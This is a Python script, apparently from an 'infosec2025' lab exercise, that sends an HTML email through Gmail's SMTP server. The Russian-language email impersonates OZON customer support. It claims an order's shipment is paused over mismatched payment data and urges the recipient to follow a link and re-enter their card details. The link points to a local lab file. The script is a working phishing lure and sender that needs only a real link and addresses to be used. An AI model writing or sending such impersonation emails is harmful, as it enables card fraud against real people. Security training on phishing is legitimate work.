import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


# Email server details (for example, Gmail's SMTP)
smtp_server = "smtp.gmail.com"
smtp_port = 587
sender_email = ""  # Replace with your email address
sender_password = ""     # Replace with your email password or app-specific password
receiver_email = ""  # Replace with the recipient's email



# HTML email content
subject = "Подтвердите платежные данные для отправки заказа"
body = """
<!DOCTYPE html>
<html lang="ru">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>OZON Email Style</title>
   <style>
       body {
           font-family: Arial, sans-serif;
           margin: 0;
           padding: 0;
           background-color: #fafafa;
       }
       .container {
           max-width: 600px;
           margin: 0 auto;
           background-color: #ffffff;
           padding: 20px;
           border-radius: 10px;
           box-shadow: 0 4px 8px rgba(0,0,0,0.1);
       }
       .header {
           display: flex;
           align-items: center;
           padding-bottom: 20px;
       }
       .header img {
           width: 60px;
           margin-right: 10px;
       }
       .header h2 {
           margin: 0;
           font-size: 24px;
           color: #FF6B00;
       }
       .button {
           display: inline-block;
           background-color: #FF6B00;
           color: white;
           text-decoration: none;
           padding: 12px 24px;
           border-radius: 5px;
           font-size: 16px;
           text-align: center;
           border: none;
       }
       .footer {
           text-align: center;
           margin-top: 20px;
           font-size: 14px;
           color: #888;
       }
   </style>
</head>
<body>
   <div class="container">
       <div class="header">
           <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fpngimg.com%2Fuploads%2Fozon%2Fozon_PNG2.png&f=1&nofb=1&ipt=f0b1036a09da2d201417c0d4ac66cffe747734d8d987b0634608f09a557e7491" alt="OZON Logo">
       </div>
       <p style="font-size: 16px; color: #333;">
           Здравствуйте!<br>
           Ваш заказ №88873 был успешно оформлен, но из-за несоответствия платежных данных его отправка временно приостановлена.<br>
           Для подтверждения оплаты и ускорения доставки, пожалуйста, перейдите по ссылке и повторно введите данные карты:
       </p>
       <p style="font-size: 16px; color: #333;">/home/user/Public/infosec2025/lab04/task/ozon.html</p>

       <div class="footer">
           <p>Если вы уже подтвердили оплату, проигнорируйте это сообщение.</p>
           <p>С уважением,<br>
           Служба поддержки OZON</p>
       </div>
   </div>
  <script>
       function redirectToPage() {
           window.open('/home/user/Public/infosec2025/lab04/task/ozon.html', '_blank'); // Opens in a new tab
       }
   </script>
</body>
</html>
"""


# Set up the MIME
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject


# Attach the body with the HTML content
message.attach(MIMEText(body, "html"))


# Send the email
try:
   # Establish a secure session with the server
   server = smtplib.SMTP(smtp_server, smtp_port)
   server.starttls()  # Secure the connection
   server.login(sender_email, sender_password)  # Log into the email server
   text = message.as_string()
   server.sendmail(sender_email, receiver_email, text)  # Send the email
   print("Email sent successfully!")
except Exception as e:
   print(f"Error sending email: {e}")
finally:
   server.quit()  # Close the connection